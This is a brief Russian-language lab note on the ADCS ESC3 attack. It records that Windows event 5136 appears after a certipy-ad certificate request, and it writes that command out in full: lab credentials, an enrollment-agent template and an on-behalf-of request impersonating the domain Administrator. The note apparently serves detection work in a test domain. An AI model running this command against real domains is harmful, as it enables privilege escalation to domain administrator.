# ESC3

ПОМЕТКА:

СОБЫТИЕ 5136 - появилось не случайно, генерируется после запроса:  certipy-ad req -u 'test@work.local' -p 'Password123!' -ca 'work-DC01-CA' -target 'dc01.work.local' -template 'ESC3_2' -on-behalf-of 'WORK\Администратор' -pfx test.pfx -dc-ip 192.168.0.10 -debug
 
 В событие будет (CN=Администратор) на выпускаемую УЗ